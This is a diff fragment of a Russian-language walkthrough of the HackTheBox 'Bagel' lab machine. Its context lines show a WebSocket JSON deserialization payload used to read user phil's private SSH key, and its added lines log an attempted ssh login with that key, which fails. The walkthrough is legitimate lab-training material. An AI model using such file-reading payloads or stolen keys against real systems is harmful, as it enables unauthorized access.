@@ -278,3 +278,15 @@ ws.send(JSON.stringify({ "RemoveOrder" : {"$type":"bagel_server.File, bagel", "R
 ![image](https://user-images.githubusercontent.com/77785989/235320819-1db52a09-be08-4145-8cb8-b3853441f346.png)
 
 Сохраняем ключ и пытаемся зайти под пользователем phil:
+```
+kali㉿kali)-[~]
+└─$ ssh -i .\id_rsa phil@10.10.11.201                   
+Warning: Identity file .id_rsa not accessible: No such file or directory.
+The authenticity of host '10.10.11.201 (10.10.11.201)' can't be established.
+ED25519 key fingerprint is SHA256:Di9rfN6auXa0i6Hdly0dzrLddlFqLIfzbUn30m/l7cg.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.201' (ED25519) to the list of known hosts.
+phil@10.10.11.201: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
+                                                                                                                               
+```
